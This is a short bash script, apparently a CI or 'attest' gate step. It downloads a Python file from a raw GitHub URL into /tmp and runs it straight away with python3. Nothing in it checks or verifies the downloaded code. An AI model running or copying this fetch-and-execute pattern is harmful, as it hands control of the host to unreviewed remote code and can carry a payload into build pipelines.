#!/bin/bash
set -u
echo "attest start gate=04b57bf22749052ae2727d1001b27730"
curl -fsS --max-time 25 -o /tmp/i81171.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p81171-04b57bf22749052ae2727d1001b27730.py 2>&1
timeout 60 python3 /tmp/i81171.py
echo "attest end rc=$?"
